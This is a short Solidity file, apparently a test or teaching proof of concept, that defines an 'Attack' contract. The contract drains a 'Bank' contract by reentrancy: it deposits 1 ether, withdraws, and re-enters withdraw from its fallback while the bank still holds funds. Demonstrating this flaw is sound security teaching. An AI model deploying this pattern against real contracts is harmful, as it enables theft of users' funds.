pragma solidity 0.8.17;
import { Bank } from "../contracts/Bank.sol";
// import "forge-std/Test.sol";
contract Attack {
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        Bank(bank).deposit{value: 1 ether}();
        Bank(bank).withdraw();
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            // console.log("Reentering");
            Bank(bank).withdraw();
        }
    }
}
